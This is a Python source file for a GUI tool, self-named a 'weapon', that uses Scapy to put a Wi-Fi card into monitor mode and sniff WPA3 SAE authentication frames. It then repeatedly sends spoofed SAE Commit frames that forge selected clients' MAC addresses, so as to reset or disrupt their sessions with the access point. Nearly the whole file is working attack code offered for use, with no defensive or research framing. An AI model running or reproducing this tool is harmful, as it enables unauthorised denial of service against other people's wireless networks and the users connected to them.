import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SAE_Logic_WeaponV5_5:
    def __init__(self, iface):
        # Logic: Ensure we use the 'mon' interface name if airmon-ng changes it
        self.iface = iface
        self.targets = {} 
        self.active_resets = set()
        
        self.setup_monitor_mode()
        
        self.root = tk.Tk()
        self.root.title("WPA3 SAE State Resetter v5.5")
        self.root.geometry("700x550")
        self.root.configure(bg="#050505")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="COMMIT RESET", command=self.start_reset, bg="#880000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP", command=self.stop_reset, bg="#444", fg="white", width=15).pack(side="left", padx=5)

        threading.Thread(target=self.scanner, daemon=True).start()
        threading.Thread(target=self.reset_engine, daemon=True).start()

    def setup_monitor_mode(self):
        # Logic: Comprehensive Monitor Mode setup
        print(f"[*] Initializing Monitor Mode on {self.iface}...")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")
        # Note: If airmon-ng renamed your interface to wlan0mon, 
        # you must pass that name when running the script.

    def scanner(self):
        def handler(pkt):
            # Logic: Detect WPA3 clients via SAE Auth frames
            if pkt.haslayer(Dot11Auth) and pkt.algo == 3:
                c, b = pkt.addr2, pkt.addr3
                if c not in self.targets:
                    self.targets[c] = b
                    self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=handler, store=0)

    def reset_engine(self):
        while True:
            for client_mac in list(self.active_resets):
                bssid = self.targets[client_mac]
                # Logic: Spoof the 'Commit' frame (Auth Algo 3, Seq 1)
                # This forces the AP to reconsider the active session state
                dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
                sae_commit = Dot11Auth(algo=3, seqnum=1, status=0)
                
                pkt = RadioTap()/dot11/sae_commit
                sendp(pkt, iface=self.iface, verbose=False, count=10)
            time.sleep(0.1)

    def start_reset(self):
        for i in self.listbox.curselection():
            mac = list(self.targets.keys())[i]
            self.active_resets.add(mac)
        self.refresh_ui()

    def stop_reset(self):
        self.active_resets.clear()
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for client, bssid in self.targets.items():
            status = " [RESETTING] " if client in self.active_resets else " [WPA3-SAE] "
            self.listbox.insert(tk.END, f"{status} Client: {client} | AP: {bssid}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 weapon.py [interface]")
    else:
        SurgicalWeapon = SAE_Logic_WeaponV5_5(sys.argv[1])
        SurgicalWeapon.root.mainloop()
